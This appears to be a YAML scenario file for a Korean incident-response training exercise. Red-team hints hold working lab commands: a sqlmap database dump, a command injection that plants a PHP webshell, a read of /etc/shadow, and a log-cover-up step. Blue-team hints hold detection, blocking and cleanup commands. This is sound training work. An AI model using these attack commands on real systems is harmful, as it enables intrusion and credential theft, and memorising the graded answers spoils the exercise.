@@ -1,0 +1,125 @@
+id: "incident-response"
+title: "인시던트 대응 시뮬레이션"
+description: "보안 관제 센터(SOC)에서 웹 서버 침해 의심 알림이 발생했다. Red Team은 SQLi, 웹셸 업로드, 권한 상승을 복합적으로 수행하여 전면적인 침해를 시도한다. Blue Team은 NIST 인시던트 대응 프로세스에 따라 탐지, 분석, 격리, 복구를 체계적으로 수행해야 한다."
+difficulty: "hard"
+time_limit: 3600
+battle_type: "1v1"
+
+red_missions:
+  - order: 1
+    instruction: "1단계 - SQLi로 DVWA 데이터베이스에서 관리자 크리덴셜을 추출하라."
+    hint: "sqlmap -u 'http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=test' --batch -T users --dump 2>&1 | tail -20"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "admin"
+
+  - order: 2
+    instruction: "2단계 - Command Injection으로 웹 서버에 PHP 웹셸을 생성하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;echo+\"<?php+system(\\$_GET[c]);+?>\">/var/www/html/cmd.php+2>&1;echo+webshell_created&Submit=Submit'"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "webshell_created"
+
+  - order: 3
+    instruction: "3단계 - 웹셸을 통해 시스템 정보를 수집하라."
+    hint: "curl -s 'http://10.20.30.80/cmd.php?c=id;uname+-a;whoami' 2>&1 || echo 'Webshell access attempted'"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: ""
+
+  - order: 4
+    instruction: "4단계 - Command Injection으로 SUID 파일을 탐색하여 권한 상승 경로를 찾아라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;find+/usr/bin+-perm+-4000+-type+f+2>/dev/null|head+-10&Submit=Submit'"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "/usr"
+
+  - order: 5
+    instruction: "5단계 - Command Injection으로 /etc/shadow 읽기를 시도하여 패스워드 해시를 탈취하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;cat+/etc/shadow+2>&1|head+-5&Submit=Submit'"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "root"
+
+  - order: 6
+    instruction: "6단계 - 로그 파일을 변조하여 침해 흔적을 은폐하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;echo+cleaned+>+/tmp/evidence_removed+2>&1;echo+traces_removed&Submit=Submit'"
+    points: 10
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "traces_removed"
+
+blue_missions:
+  - order: 1
+    instruction: "[탐지] suricata와 Wazuh에서 현재 발생 중인 보안 알림을 확인하라."
+    hint: "tail -20 /var/log/suricata/fast.log"
+    points: 10
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: "10.20.30"
+
+  - order: 2
+    instruction: "[분석] Apache 접근 로그에서 공격 벡터(SQLi, Command Injection)를 식별하라."
+    hint: "grep -iE 'sqlmap|union|select|exec|cmd|vulnerabilities' /var/log/apache2/access.log | tail -30"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "vulnerabilities"
+
+  - order: 3
+    instruction: "[분석] 웹 서버에서 비인가 파일(웹셸)이 생성되었는지 확인하라."
+    hint: "find /var/www -name '*.php' -newer /var/log/apache2/access.log -ls 2>/dev/null; grep -rl 'system\\|shell_exec\\|passthru' /var/www/ 2>/dev/null"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "php"
+
+  - order: 4
+    instruction: "[격리] nftables로 공격자 IP를 즉시 차단하라."
+    hint: "nft add rule inet filter input ip saddr 10.20.30.201 log prefix '\"IR-BLOCK: \"' drop"
+    points: 15
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: ""
+
+  - order: 5
+    instruction: "[격리] 웹셸 파일을 삭제하고 관련 악성 파일을 제거하라."
+    hint: "find /var/www -name '*.php' -exec grep -l 'system\\|shell_exec\\|passthru' {} \\; -exec rm -v {} \\; 2>/dev/null; echo 'Cleanup complete'"
+    points: 20
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "Cleanup complete"
+
+  - order: 6
+    instruction: "[복구] Apache 서비스를 재시작하고 정상 동작을 확인하라."
+    hint: "systemctl restart apache2 && systemctl status apache2 | head -5"
+    points: 10
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "active"
+
+  - order: 7
+    instruction: "[보고] 전체 인시던트 타임라인을 suricata 로그에서 재구성하라."
+    hint: "grep '10.20.30.201' /var/log/suricata/eve.json | python3 -c \"import sys,json; [print(json.loads(l).get('timestamp','')[:19], json.loads(l).get('event_type','')) for l in sys.stdin]\" 2>/dev/null | sort | tail -30"
+    points: 15
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: ""
